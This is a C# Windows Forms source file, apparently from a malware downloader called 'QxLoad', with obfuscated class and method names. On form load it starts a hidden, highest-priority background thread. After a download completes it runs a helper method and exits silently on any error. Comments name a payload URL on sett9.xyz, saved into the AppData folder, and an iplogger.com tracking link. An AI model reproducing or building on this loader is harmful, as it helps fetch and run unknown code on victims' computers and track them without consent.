﻿using QxLoad.XqeUdel;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;


namespace QxLoad
{
    public partial class xqgfryeq : Form
    {

        //public static string filename;
        //public static string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/";
        //public static string link = "https://sett9.xyz/LoadQx/PTS";


        public xqgfryeq()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                //xzctvdf_c.reigkr("https://iplogger.com/1JjaV6");
                var load = new Thread(xzctvdf_c.pmrguwc)
                {
                    Priority = ThreadPriority.Highest,
                    IsBackground = true
                };
                load.Start();
            }
            catch (Exception ex)
            {
                Environment.Exit(0);
                return;
            }
        }


        public static void ProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            //--
        }

        public static void Completed(object sender, AsyncCompletedEventArgs e)
        {
            try
            {
                if (e.Error != null)
                {
                    
                    Environment.Exit(0);
                    return;
                }
                else
                {
                    try
                    {
                        xzctvdf_c.pforinv();                     
                        
                        Environment.Exit(0);
                    }
                    catch (Exception ex)
                    {
                        //--
                    }
                }
            }
            catch (Exception ex)
            {               
                //--
            }

        }

        
    }
}
